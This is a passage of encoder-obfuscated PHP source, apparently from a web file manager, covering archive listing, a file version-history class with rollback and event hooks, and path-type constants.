= self::getContent($•‹ĞÙŠ); if ($¯£‰«µÁ) { $œĞ—Ëå¦ = json_decode($¯£‰«µÁ, !0); $œĞ—Ëå¦ = is_array($œĞ—Ëå¦) ? $œĞ—Ëå¦ : array(); if (count($œĞ—Ëå¦) >= $ŸË·Ë†) { show_json(sprintf(LNG($Ü‘éÅ¡ò[1191]), count($œĞ—Ëå¦)), !1); } return $œĞ—Ëå¦; } } else { $•‹ĞÙŠ = self::mkfile($•‹ĞÙŠ); } } $èÉƒ’Œ = TEMP_FILES . $ÁÑÚÈıû; if (!is_dir($èÉƒ’Œ)) { mk_dir($èÉƒ’Œ); } $Ñ¼µ” = $èÉƒ’Œ . $Ü‘éÅ¡ò[8] . $éÓÜ¼…‚; if (!@file_exists(self::iconvSystem($Ñ¼µ”))) { if (isset($™›÷‰Ì)) { url_request($ÑéÌ½½º, $Ü‘éÅ¡ò[1192], $Ñ¼µ”); } else { $ùî’Ò€ê = self::localFilePath($ÑéÌ½½º, $Ø¥¢ÕÃÀ); $Ñ¼µ” = $ùî’Ò€ê ? $ùî’Ò€ê : self::download($ÑéÌ½½º, $Ñ¼µ”); } } $Ñ¼µ” = self::iconvSystem($Ñ¼µ”); if ($Í¤Ì¬¤ >= 0) { $öŸ¶“¿Æ = isset($¦ƒª›Õ[$Ü‘éÅ¡ò[1193]]) ? $¦ƒª›Õ[$Ü‘éÅ¡ò[1193]] : !1; $Ïµ›½ù‹ = isset($¦ƒª›Õ[$Ü‘éÅ¡ò[32]]) ? $¦ƒª›Õ[$Ü‘éÅ¡ò[32]] : $Ü‘éÅ¡ò[12]; KodArchive::filePreview($Ñ¼µ”, $Í¤Ì¬¤, $öŸ¶“¿Æ, $Ïµ›½ù‹); self::archiveExt(); die; } $Éäûõòò = KodArchive::listContent($Ñ¼µ”); self::archiveExt(); del_dir($èÉƒ’Œ); if (!$Éäûõòò[$Ü‘éÅ¡ò[1185]]) { show_json($Éäûõòò[$Ü‘éÅ¡ò[1187]], !1); } $œĞ—Ëå¦ = json_encode($Éäûõòò[$Ü‘éÅ¡ò[1187]]); self::setContent($•‹ĞÙŠ, $œĞ—Ëå¦); if (count($Éäûõòò[$Ü‘éÅ¡ò[1187]]) >= $ŸË·Ë†) { show_json(sprintf(LNG($Ü‘éÅ¡ò[1191]), count($Éäûõòò[$Ü‘éÅ¡ò[1187]])), !1); } return $Éäûõòò[$Ü‘éÅ¡ò[1187]]; } private static function fileExt($Ğ°Àµåò) { $ò¶®°Ÿ¤ =& $_SERVER[Ãìšã«™]; $•¿¯’ï– = $Ğ°Àµåò[$ò¶®°Ÿ¤[167]]; if ($•¿¯’ï– == $ò¶®°Ÿ¤[1194]) { $–Ïı•­å = $ò¶®°Ÿ¤[1195]; if (substr($Ğ°Àµåò[$ò¶®°Ÿ¤[32]], -strlen($–Ïı•­å)) == $–Ïı•­å) { $•¿¯’ï– = $ò¶®°Ÿ¤[1196]; } } self::archiveExt($•¿¯’ï–); return $•¿¯’ï–; } private static function zipFileList($”œíñäÃ, $­ğÕµ¸ = false) { $ñ´”ƒ… =& $_SERVER[Ãìšã«™]; $ÂÙ‰‰¯ = array(); foreach ($”œíñäÃ as $šÇ‘íôó) { $¯Ö«îåò = $šÇ‘íôó[$ñ´”ƒ…[78]]; if ($­ğÕµ¸) { $¯Ö«îåò = self::copy($šÇ‘íôó[$ñ´”ƒ…[78]], $­ğÕµ¸, $ñ´”ƒ…[819]); } else { $‚ºµŠä = self::init($šÇ‘íôó[$ñ´”ƒ…[78]]); if ($‚ºµŠä->getType() == $ñ´”ƒ…[107]) { $¯Ö«îåò = $‚ºµŠä->path; } } if ($¯Ö«îåò && self::local()->exist($¯Ö«îåò)) { $ÂÙ‰‰¯[$šÇ‘íôó[$ñ´”ƒ…[78]]] = $¯Ö«îåò; } } if (!empty($ÂÙ‰‰¯)) { return array_values($ÂÙ‰‰¯); } show_json(LNG($ñ´”ƒ…[1160]), !1); } public static function tmpFileName($ú®Ø») { $°ˆšÚŠã =& $_SERVER[Ãìšã«™]; $Í¬›İ€¯ = array($ú®Ø»[$°ˆšÚŠã[32]], $ú®Ø»[$°ˆšÚŠã[78]], $ú®Ø»[$°ˆšÚŠã[80]], $ú®Ø»[$°ˆšÚŠã[521]]); return md5(implode($°ˆšÚŠã[11], $Í¬›İ€¯)); } private static function localFilePath($àÀã×½Š, $÷ü´Ÿ) { $¥ÖÑé³Ø =& $_SERVER[Ãìšã«™]; if ($÷ü´Ÿ == $¥ÖÑé³Ø[1197] && strtoupper(substr(PHP_OS, 0, 3)) == $¥ÖÑé³Ø[1198]) { return !1; } $ÊÑÓ¬àË = KodIO::parse($àÀã×½Š); if ($ÊÑÓ¬àË[$¥ÖÑé³Ø[33]] == KodIO::KOD_SOURCE) { $Í††ˆÃŞ = Model($¥ÖÑé³Ø[826])->fileInfoGet(KodIO::sourceID($àÀã×½Š)); if (!$Í††ˆÃŞ[$¥ÖÑé³Ø[78]]) { show_json($¥ÖÑé³Ø[1199], !1); } $àÀã×½Š = $Í††ˆÃŞ[$¥ÖÑé³Ø[78]]; } $æ§†Òøğ = self::init($àÀã×½Š); if ($æ§†Òøğ->pathParse[$¥ÖÑé³Ø[1147]]) { $àÀã×½Š = $æ§†Òøğ->pathParse[$¥ÖÑé³Ø[1147]]; $æ§†Òøğ = self::init($àÀã×½Š); } $ş‰Òê»Å = $æ§†Òøğ->getType(); if ($ş‰Òê»Å == $¥ÖÑé³Ø[107] || $ş‰Òê»Å == $¥ÖÑé³Ø[1200]) { if (!$æ§†Òøğ->exist($æ§†Òøğ->path)) { show_json(LNG($¥ÖÑé³Ø[106]), !1); } return $æ§†Òøğ->path; } return !1; } private static function archiveExt($±øè¬üÂ = '') { $GLOBALS[$_SERVER[Ãìšã«™][1201]] = $±øè¬üÂ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ğÚû…£Î =& $_SERVER[Ãìšã«™]; $ö¸‰ƒ®¡ = $GLOBALS[$ğÚû…£Î[6]][$ğÚû…£Î[90]]; if ($ö¸‰ƒ®¡[$ğÚû…£Î[1202]] != 1) { return; } if ($ö¸‰ƒ®¡[$ğÚû…£Î[1203]] <= 0) { return; } if (isset($_REQUEST[$ğÚû…£Î[1204]]) && $_REQUEST[$ğÚû…£Î[1204]] == $ğÚû…£Î[89]) { return; } Hook::bind($ğÚû…£Î[1205], $ğÚû…£Î[1206]); Hook::bind($ğÚû…£Î[1207], $ğÚû…£Î[1208]); Hook::bind($ğÚû…£Î[1209], $ğÚû…£Î[1210]); Hook::bind($ğÚû…£Î[1211], $ğÚû…£Î[1212]); Hook::bind($ğÚû…£Î[1213], $ğÚû…£Î[1214]); Hook::bind($ğÚû…£Î[1215], $ğÚû…£Î[1216]); } public static function eventBeforeUpload($§ì¸Ò¥) { if ($§ì¸Ò¥[3] && $§ì¸Ò¥[3] != REPEAT_REPLACE) { return; } $¤¹çâõ = self::parsePath($§ì¸Ò¥[0]); if (!$¤¹çâõ) { return; } self::add($¤¹çâõ); } public static function eventBeforeEdit($Ê†¦ÍßÙ) { $İ‘Ì˜ = self::parsePath($Ê†¦ÍßÙ[0]); if (!$İ‘Ì˜) { return; } self::add($İ‘Ì˜); } public static function eventBeforeCopyFile($ë˜ˆµ®, $ç™œ»ˆË, $åÛó¬ÉÏ, $É¦ ¿Î¿, $ÜÀŒ§ª€, $€Ç¢ú†ç) { $àöÂ„ ‰ = $åÛó¬ÉÏ->getPathOuter($É¦ ¿Î¿); $¹ÔÀ»ğ» = self::parsePath($àöÂ„ ‰); if (!$¹ÔÀ»ğ») { return; } self::add($¹ÔÀ»ğ»); } public static function eventBeforeRename($ÆÚ˜­”) { $§İøÕ¿Á =& $_SERVER[Ãìšã«™]; $ÜÖ‹¥€Õ = self::parsePath($ÆÚ˜­”[0]); if (!$ÜÖ‹¥€Õ) { return; } $šôâ¤Œ¥ = self::checkInHistory($ÜÖ‹¥€Õ); if (!$šôâ¤Œ¥) { return; } if ($šôâ¤Œ¥[$§İøÕ¿Á[33]] == $§İøÕ¿Á[192]) { $¿š°†ö‹ = self::listData($ÜÖ‹¥€Õ); if ($¿š°†ö‹ && $¿š°†ö‹[$§İøÕ¿Á[364]]) { self::moveHistory($ÜÖ‹¥€Õ, $ÆÚ˜­”[1]); } } else { IO::rename($šôâ¤Œ¥[$§İøÕ¿Á[78]], $ÆÚ˜­”[1]); } } public static function eventBeforeMove($‘…Ï†¥) { $¦‹‡‰ûÇ =& $_SERVER[Ãìšã«™]; $ÚÔÙïª = self::parsePath($‘…Ï†¥[0]); if (!$ÚÔÙïª) { return; } $’ÍÌ¸Ò™ = self::parsePath($‘…Ï†¥[1]); if (!$’ÍÌ¸Ò™) { return; } $¹¶²ò½ = $‘…Ï†¥[3]; $ÖÎ“”üö = self::checkInHistory($ÚÔÙïª); if (!$ÖÎ“”üö) { return; } $Î¥ğ¿”™ = self::pathHistory($’ÍÌ¸Ò™); if ($ÖÎ“”üö[$¦‹‡‰ûÇ[33]] == $¦‹‡‰ûÇ[192]) { $ÓŞç¥Òë = self::listData($ÚÔÙïª); $¿Æƒßó = rtrim($’ÍÌ¸Ò™, $¦‹‡‰ûÇ[8]) . $¦‹‡‰ûÇ[8] . ($¹¶²ò½ ? $¹¶²ò½ : get_path_this($ÚÔÙïª)); $“óÁÂş = self::listData($¿Æƒßó); if ($ÓŞç¥Òë && $ÓŞç¥Òë[$¦‹‡‰ûÇ[364]] && $“óÁÂş && $“óÁÂş[$¦‹‡‰ûÇ[364]]) { return self::clear($ÚÔÙïª); } if ($ÓŞç¥Òë && $ÓŞç¥Òë[$¦‹‡‰ûÇ[364]]) { self::moveHistory($ÚÔÙïª, $¹¶²ò½, $Î¥ğ¿”™); } } else { IO::move($ÖÎ“”üö[$¦‹‡‰ûÇ[78]], $Î¥ğ¿”™, !1, $¹¶²ò½); self::clearEmptyFolder(IO::pathFather($ÖÎ“”üö[$¦‹‡‰ûÇ[78]])); } } public static function eventAfterRemove($˜›®•ğ¢, $á°†Êª) { $ú¬¨¢óÍ =& $_SERVER[Ãìšã«™]; if (!$á°†Êª) { return; } $ÓĞšØÍŒ = self::parsePath($˜›®•ğ¢[0]); if (!$ÓĞšØÍŒ) { return; } $¥‰Ãº… = self::checkInHistory($ÓĞšØÍŒ); if (!$¥‰Ãº…) { return; } if ($¥‰Ãº…[$ú¬¨¢óÍ[33]] == $ú¬¨¢óÍ[192]) { $Œ¦Ñ°êó = self::listData($ÓĞšØÍŒ, !1); if ($Œ¦Ñ°êó && $Œ¦Ñ°êó[$ú¬¨¢óÍ[364]]) { self::clear($ÓĞšØÍŒ, !1); } } else { IO::remove($¥‰Ãº…[$ú¬¨¢óÍ[78]]); self::clearEmptyFolder(IO::pathFather($¥‰Ãº…[$ú¬¨¢óÍ[78]])); } } private static function checkInHistory($·÷¨ç–Ñ) { $ØÀ£Ö’ = self::pathHistory($·÷¨ç–Ñ); if (!IO::exist($ØÀ£Ö’)) { $ØÀ£Ö’ .= $_SERVER[Ãìšã«™][1217]; } return IO::exist($ØÀ£Ö’) ? IO::info($ØÀ£Ö’) : !1; } private static function parsePath($£Í´îÕ) { $¬“´†ß =& $_SERVER[Ãìšã«™]; if (!$£Í´îÕ) { return !1; } if ($GLOBALS[$¬“´†ß[1218]]) { return; } $²ú¤—ï¼ = KodIO::parse($£Í´îÕ); $æ·Äß€Ã = $²ú¤—ï¼[$¬“´†ß[33]]; $ºŞ¥›ƒ£ = !$æ·Äß€Ã || $æ·Äß€Ã == KodIO::KOD_IO || $æ·Äß€Ã == KodIO::KOD_SHARE_ITEM; if (!$ºŞ¥›ƒ£ || !$²ú¤—ï¼[$¬“´†ß[1219]]) { return !1; } if (substr($£Í´îÕ, 0, strlen(DATA_PATH . $¬“´†ß[1220])) == DATA_PATH . $¬“´†ß[1220]) { return !1; } if ($æ·Äß€Ã == KodIO::KOD_SHARE_ITEM) { $Ú€ãÒ®Ô = IO::init($£Í´îÕ); if ($Ú€ãÒ®Ô->pathParse[$¬“´†ß[1147]]) { return self::parsePath($Ú€ãÒ®Ô->pathParse[$¬“´†ß[1147]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¦®¿Ãí­ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¬“´†ß[1221]); foreach ($¦®¿Ãí­ as $ŸÜ®ŸŠ·) { if (!$æ·Äß€Ã && substr($£Í´îÕ, 0, strlen($ŸÜ®ŸŠ·)) == $ŸÜ®ŸŠ·) { return !1; } } self::log($GLOBALS[$¬“´†ß[1142]] . $¬“´†ß[1222] . $£Í´îÕ); return $£Í´îÕ; } private static function pathHistory($Ì“èüÌ¡) { $¨¶ÎÀ =& $_SERVER[Ãìšã«™]; $²¢¯¡àó = self::$_historyBase . ltrim(KodIO::clear($Ì“èüÌ¡), $¨¶ÎÀ[8]); $²¢¯¡àó = str_replace(array($¨¶ÎÀ[1223]), array($¨¶ÎÀ[1224]), $²¢¯¡àó); return $²¢¯¡àó; } public static function log($¾œÙüßê) { } public static function historyCount($ƒ£ç˜Ôğ) { $´è¥äŞ‹ =& $_SERVER[Ãìšã«™]; $Ù»ÀÊáÑ = array(); $¼ÛıÎú = array(); foreach ($ƒ£ç˜Ôğ as $µñ°ãÆ×) { $Õ½”²õ§ = get_path_father($µñ°ãÆ×); if (!$¼ÛıÎú[$Õ½”²õ§]) { $¼ÛıÎú[$Õ½”²õ§] = array(); } $¼ÛıÎú[$Õ½”²õ§][] = get_path_this($µñ°ãÆ×); } foreach ($¼ÛıÎú as $Õ½”²õ§ => $ˆÍÇ«”Ó) { $ÇâÙ ²Ç = self::parsePath($Õ½”²õ§); if (!$ÇâÙ ²Ç) { continue; } foreach ($ˆÍÇ«”Ó as $ú‡æıÚ¸) { $âÏÖê = self::listData(rtrim($ÇâÙ ²Ç, $´è¥äŞ‹[8]) . $´è¥äŞ‹[8] . $ú‡æıÚ¸, !1); if ($âÏÖê && $âÏÖê[$´è¥äŞ‹[364]]) { $Ù»ÀÊáÑ[rtrim($Õ½”²õ§, $´è¥äŞ‹[8]) . $´è¥äŞ‹[8] . $ú‡æıÚ¸] = count($âÏÖê[$´è¥äŞ‹[364]]); } } } return $Ù»ÀÊáÑ; } public static function add($ßÎ“À“î) { $„Âİ¤úá =& $_SERVER[Ãìšã«™]; $ö¤Ş‚ÃŒ = self::listData($ßÎ“À“î); if (!$ö¤Ş‚ÃŒ) { return; } $Í»îÃ•Û = Model($„Âİ¤úá[771])->get($„Âİ¤úá[1225]); $ğúÙÄß = $GLOBALS[$„Âİ¤úá[6]][$„Âİ¤úá[90]][$„Âİ¤úá[1203]]; $–ğ¦ŒòÊ = $Í»îÃ•Û == $„Âİ¤úá[1226] ? 5 : $ğúÙÄß; if ($ğúÙÄß <= 0) { return; } $Œ¨ùìá½ = IO::hashSimple($ßÎ“À“î); $ŸèáæÇ¤ = IO::info($ßÎ“À“î); $öÔèÂıÀ = $ö¤Ş‚ÃŒ[$„Âİ¤úá[364]]; if ($ŸèáæÇ¤[$„Âİ¤úá[80]] == 0) { return; } if ($ŸèáæÇ¤[$„Âİ¤úá[80]] >= 1024 * 1024 * 500) { return !1; } if ($öÔèÂıÀ && $öÔèÂıÀ[0][$„Âİ¤úá[170]] == $Œ¨ùìá½) { return !0; } if (array_key_exists($„Âİ¤úá[195], $ŸèáæÇ¤) && !$ŸèáæÇ¤[$„Âİ¤úá[195]]) { return !1; } $®Üß‹õ• = short_id(time()); $íê¦€›Ğ = array($„Âİ¤úá[392] => $®Üß‹õ•, $„Âİ¤úá[170] => $Œ¨ùìá½, $„Âİ¤úá[32] => $ŸèáæÇ¤[$„Âİ¤úá[32]] . $„Âİ¤úá[10] . date($„Âİ¤úá[1227]) . rand_string(1), $„Âİ¤úá[80] => $ŸèáæÇ¤[$„Âİ¤úá[80]], $„Âİ¤úá[452] => USER_ID, $„Âİ¤úá[193] => time(), $„Âİ¤úá[1228] => $„Âİ¤úá[12]); IO::mkdir($ö¤Ş‚ÃŒ[$„Âİ¤úá[1229]]); $µøÑŒÉé = IO::copy($ßÎ“À“î, $ö¤Ş‚ÃŒ[$„Âİ¤úá[1229]], !1, $íê¦€›Ğ[$„Âİ¤úá[32]]); if (!$µøÑŒÉé) { self::clearEmptyFolder($ö¤Ş‚ÃŒ[$„Âİ¤úá[1229]]); return !1; } array_unshift($öÔèÂıÀ, $íê¦€›Ğ); if (count($öÔèÂıÀ) > $–ğ¦ŒòÊ) { $¤Ø¢Æ» = array_slice($öÔèÂıÀ, $–ğ¦ŒòÊ); foreach ($¤Ø¢Æ» as $×Í´±×­) { IO::remove($ö¤Ş‚ÃŒ[$„Âİ¤úá[1229]] . $×Í´±×­[$„Âİ¤úá[32]]); } $öÔèÂıÀ = array_slice($öÔèÂıÀ, 0, $–ğ¦ŒòÊ); } return self::saveData($ö¤Ş‚ÃŒ[$„Âİ¤úá[1230]], $öÔèÂıÀ); } public static function remove($ÆˆÕúô, $ƒ’Å”¶¡) { $Î·ù²¼ =& $_SERVER[Ãìšã«™]; $•Ä¸œˆŒ = self::listData($ÆˆÕúô); $ı¾Î÷ñâ = array(); if (!$•Ä¸œˆŒ) { return !1; } foreach ($•Ä¸œˆŒ[$Î·ù²¼[364]] as $ë€ª®æ) { if ($ë€ª®æ[$Î·ù²¼[392]] == $ƒ’Å”¶¡) { IO::remove($•Ä¸œˆŒ[$Î·ù²¼[1229]] . $ë€ª®æ[$Î·ù²¼[32]]); continue; } $ı¾Î÷ñâ[] = $ë€ª®æ; } return self::saveData($•Ä¸œˆŒ[$Î·ù²¼[1230]], $ı¾Î÷ñâ); } public static function clear($áò•Úã©, $‚ØúŠ©Ş = true) { $í‰Ï²²’ =& $_SERVER[Ãìšã«™]; $ÓüÒË£¯ = self::listData($áò•Úã©, $‚ØúŠ©Ş); if (!$ÓüÒË£¯) { return !1; } foreach ($ÓüÒË£¯[$í‰Ï²²’[364]] as $ãï‡à´Á) { IO::remove($ÓüÒË£¯[$í‰Ï²²’[1229]] . $ãï‡à´Á[$í‰Ï²²’[32]]); } return self::saveData($ÓüÒË£¯[$í‰Ï²²’[1230]], array()); } public static function moveHistory($¨ä„ç†, $°Á…Ç—è = '', $ó²¢øùª = '') { $í£µş§ =& $_SERVER[Ãìšã«™]; $îÍÃ³íå = self::listData($¨ä„ç†, !1); if (!$îÍÃ³íå || !$îÍÃ³íå[$í£µş§[364]]) { return !1; } $¨‘Ë¼èÄ = $í£µş§[1217]; $°Á…Ç—è = $°Á…Ç—è ? $°Á…Ç—è : get_path_this($¨ä„ç†); $ó²¢øùª = $ó²¢øùª ? $ó²¢øùª : $îÍÃ³íå[$í£µş§[1229]]; $£¸¼–ïÈ = substr(get_path_this($îÍÃ³íå[$í£µş§[1230]]), 0, -strlen($¨‘Ë¼èÄ)); foreach ($îÍÃ³íå[$í£µş§[364]] as $äØëİ§ş => $çâóÎ„ò) { $°£ÖŒòÑ = $°Á…Ç—è . substr($çâóÎ„ò[$í£µş§[32]], strlen($£¸¼–ïÈ)); $à‘«íÂ = IO::move($îÍÃ³íå[$í£µş§[1229]] . $çâóÎ„ò[$í£µş§[32]], $ó²¢øùª, !1, $°£ÖŒòÑ); if ($à‘«íÂ) { $îÍÃ³íå[$í£µş§[364]][$äØëİ§ş][$í£µş§[32]] = $°£ÖŒòÑ; } } $îÍÃ³íå[$í£µş§[1230]] = IO::move($îÍÃ³íå[$í£µş§[1230]], $ó²¢øùª, !1, $°Á…Ç—è . $¨‘Ë¼èÄ); self::saveData($îÍÃ³íå[$í£µş§[1230]], $îÍÃ³íå[$í£µş§[364]]); self::clearEmptyFolder($îÍÃ³íå[$í£µş§[1229]]); } public static function rollback($©İ´¬˜³, $ È«¼°Á) { $Ş·ëîïÌ =& $_SERVER[Ãìšã«™]; $ó“İšØè = self::listData($©İ´¬˜³); if (!$ó“İšØè) { return; } $µæ˜›¸’ = IO::info($©İ´¬˜³); foreach ($ó“İšØè[$Ş·ëîïÌ[364]] as $¥Ú±¸ÓÌ => $ùêãîÕØ) { if ($ùêãîÕØ[$Ş·ëîïÌ[392]] == $ È«¼°Á) { self::add($©İ´¬˜³); $Øø¿—çÕ = $ó“İšØè[$Ş·ëîïÌ[1229]] . $ùêãîÕØ[$Ş·ëîïÌ[32]]; $¢ú€‹¶ = IO::copy($Øø¿—çÕ, IO::pathFather($©İ´¬˜³), REPEAT_REPLACE, $µæ˜›¸’[$Ş·ëîïÌ[32]]); if ($¢ú€‹¶) { self::remove($©İ´¬˜³, $ È«¼°Á); } return $¢ú€‹¶; } } return !1; } public static function setDetail($«Â±ÕÔÖ, $Şšïäë, $²´‰¶Èö) { $„õ¢‡¯İ =& $_SERVER[Ãìšã«™]; $­‘ñÁ¸Ö = self::listData($«Â±ÕÔÖ); if (!$­‘ñÁ¸Ö) { return; } foreach ($­‘ñÁ¸Ö[$„õ¢‡¯İ[364]] as $ß¼Øä‡Ï => $†³éÔîØ) { if ($†³éÔîØ[$„õ¢‡¯İ[392]] == $Şšïäë) { $­‘ñÁ¸Ö[$„õ¢‡¯İ[364]][$ß¼Øä‡Ï][$„õ¢‡¯İ[1228]] = $²´‰¶Èö; self::saveData($­‘ñÁ¸Ö[$„õ¢‡¯İ[1230]], $­‘ñÁ¸Ö[$„õ¢‡¯İ[364]]); return !0; } } return !1; } public static function fileInfo($†ú™ÁÀ™, $´ĞÚ¿Àœ) { $¹óòêµ° =& $_SERVER[Ãìšã«™]; $ˆ¥Ş€ = self::listData($†ú™ÁÀ™); if (!$ˆ¥Ş€) { show_json(LNG($¹óòêµ°[106]), !1); } $“ê“ú = $¹óòêµ°[12]; foreach ($ˆ¥Ş€[$¹óòêµ°[364]] as $”îõ•Üº => $ªĞØÖ³Ä) { if ($ªĞØÖ³Ä[$¹óòêµ°[392]] != $´ĞÚ¿Àœ) { continue; } $“ê“ú = $ˆ¥Ş€[$¹óòêµ°[1229]] . $ªĞØÖ³Ä[$¹óòêµ°[32]]; break; } if (!$“ê“ú) { show_json(LNG($¹óòêµ°[106]), !1); } return IO::info($“ê“ú); } public static function fileOut($è÷ìÏ¶², $Å°ıîÓã, $‡ãŒºŸÛ = false) { $šÜÇâ»¨ =& $_SERVER[Ãìšã«™]; $á“åÕ† = self::fileInfo($è÷ìÏ¶², $Å°ıîÓã); $ü¢Š±¹§ =& $GLOBALS[$šÜÇâ»¨[7]]; $‡ãŒºŸÛ = isset($ü¢Š±¹§[$šÜÇâ»¨[1193]]) && $ü¢Š±¹§[$šÜÇâ»¨[1193]] == 1; if (isset($ü¢Š±¹§[$šÜÇâ»¨[33]]) && $ü¢Š±¹§[$šÜÇâ»¨[33]] == $šÜÇâ»¨[1231]) { return IO::fileOutImage($á“åÕ†[$šÜÇâ»¨[78]], $ü¢Š±¹§[$šÜÇâ»¨[1232]]); } IO::fileOut($á“åÕ†[$šÜÇâ»¨[78]], $‡ãŒºŸÛ, get_path_this($è÷ìÏ¶²)); } public static function listData($ëÚËêÛ, $î‹à÷¨¿ = true) { $Ä«²šì =& $_SERVER[Ãìšã«™]; if ($î‹à÷¨¿ && !IO::exist($ëÚËêÛ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ëÚËêÛ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÅÄãù¤ = self::pathHistory($ëÚËêÛ); $ºîÑìº· = array($Ä«²šì[1230] => $ÅÄãù¤ . $Ä«²šì[1217], $Ä«²šì[1229] => rtrim(get_path_father($ÅÄãù¤), $Ä«²šì[8]) . $Ä«²šì[8], $Ä«²šì[364] => array()); $”àÏñÃ¬ = IO::getContent($ºîÑìº·[$Ä«²šì[1230]]); if ($”àÏñÃ¬) { $Ÿ¸˜ºÑ© = json_decode($”àÏñÃ¬, !0); if (is_array($Ÿ¸˜ºÑ©)) { $ºîÑìº·[$Ä«²šì[364]] = $Ÿ¸˜ºÑ©; } } return $ºîÑìº·; } private static function saveData($œ— ‡Ğ®, $ãÜúµ¬ó) { $›¢¶ä®¡ =& $_SERVER[Ãìšã«™]; self::log($›¢¶ä®¡[1233] . $œ— ‡Ğ® . $›¢¶ä®¡[71] . count($ãÜúµ¬ó), $›¢¶ä®¡[753]); if ($ãÜúµ¬ó) { return IO::setContent($œ— ‡Ğ®, json_encode($ãÜúµ¬ó)); } $Üöàˆç» = IO::pathFather($œ— ‡Ğ®); IO::remove($œ— ‡Ğ®); self::clearEmptyFolder($Üöàˆç»); return !0; } public static function clearEmptyFolder($ã×’•ùû) { $ÚÀåıó =& $_SERVER[Ãìšã«™]; if (trim($ã×’•ùû, $ÚÀåıó[8]) == trim(self::$_historyBase, $ÚÀåıó[8])) { return; } $­òî‘»¶ = IO::pathFather($ã×’•ùû); $ÒÇà¯• = IO::has($ã×’•ùû, !0); if ($ÒÇà¯•[$ÚÀåıó[202]] > 0 || $ÒÇà¯•[$ÚÀåıó[203]] > 0) { return; } IO::remove($ã×’•ùû); self::clearEmptyFolder($­òî‘»¶); } private static function getBasePath() { $È§•ŠÊç =& $_SERVER[Ãìšã«™]; $­´èİ‡š = Model($È§•ŠÊç[1234])->get($È§•ŠÊç[1235]); if ($­´èİ‡š) { if (!IO::exist($­´èİ‡š)) { IO::mkdir($­´èİ‡š); } if (get_path_this($­´èİ‡š) == $È§•ŠÊç[1220]) { $µ¯‰Ş¨¹ = $È§•ŠÊç[1236] . rand_string(8); @rename($­´èİ‡š, get_path_father($­´èİ‡š) . $È§•ŠÊç[8] . $µ¯‰Ş¨¹); $­´èİ‡š = DATA_PATH . $µ¯‰Ş¨¹ . $È§•ŠÊç[8]; file_put_contents(DATA_PATH . $È§•ŠÊç[1237], $È§•ŠÊç[12]); Model($È§•ŠÊç[1234])->set($È§•ŠÊç[1235], $­´èİ‡š); } return $­´èİ‡š; } $­´èİ‡š = DATA_PATH . $È§•ŠÊç[1236] . rand_string(8) . $È§•ŠÊç[8]; $­´èİ‡š = IO::mkdir($­´èİ‡š); $­´èİ‡š = rtrim($­´èİ‡š, $È§•ŠÊç[8]) . $È§•ŠÊç[8]; file_put_contents($­´èİ‡š . $È§•ŠÊç[1237], $È§•ŠÊç[12]); file_put_contents(DATA_PATH . $È§•ŠÊç[1237], $È§•ŠÊç[12]); Model($È§•ŠÊç[1234])->set($È§•ŠÊç[1235], $­´èİ‡š); return $­´èİ‡š; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\x52\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\106\x69\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\106\x69\x6c\145\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\122\157\157\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\163\145\x72\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\x53\x68\x61\x72\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\x49\164\x65\155\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\122\x65\x6e\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\x76\x65\162\x7d"; public static function typeList() { $¹Ü²¬ìá =& $_SERVER[Ãìšã«™]; return array($¹Ü²¬ìá[1238] => self::KOD_SOURCE, $¹Ü²¬ìá[1239] => self::KOD_USER_RECYCLE, $¹Ü²¬ìá[1240] => self::KOD_USER_FAV, $¹Ü²¬ìá[1241] => self::KOD_USER_FILE_TAG, $¹Ü²¬ìá[1242] => self::KOD_USER_FILE_TYPE, $¹Ü²¬ìá[1243] => self::KOD_GROUP_ROOT_SELF, $¹Ü²¬ìá[1244] => self::KOD_USER_SHARE, $¹Ü²¬ìá[1245] => self::KOD_USER_SHARE_LINK, $¹Ü²¬ìá[1246] => self::KOD_USER_SHARE_TO_ME, $¹Ü²¬ìá[1247] => self::KOD_SHARE_ITEM, $¹Ü²¬ìá[1248] => self::KOD_SHARE_LINK, $¹Ü²¬ìá[1249] => self::KOD_SEARCH, $¹Ü²¬ìá[1250] => self::KOD_BLOCK, $¹Ü²¬ìá[1251] => self::KOD_IO, $¹Ü²¬ìá[1252] => self::KOD_USER_RECENT, $¹Ü²¬ìá[1253] => self::KOD_USER_DRIVER); } public static function parse($²ËÂóÁä) { $¿Â’‰¬ =& $_SERVER[Ãìšã«™]; $²ËÂóÁä = self::clear($²ËÂóÁä); $Ú†›á£‰ = array_values(self::typeList()); preg_match($¿Â’‰¬[1254], $²ËÂóÁä, $Ç§ÙÇ ı); $ã½‚€º­ = array($¿Â’‰¬[423] => !1, $¿Â’‰¬[1255] => !1, $¿Â’‰¬[420] => !1, $¿Â’‰¬[78] => $²ËÂóÁä, $¿Â’‰¬[1164] => !1, $¿Â’‰¬[1163] => $¿Â’‰¬[12]); if (is_array($Ç§ÙÇ ı) && count($Ç§ÙÇ ı) == 5) { $¡¨Â‹ôË = $¿Â’‰¬[1256] . $Ç§ÙÇ ı[2] . $¿Â’‰¬[322]; if 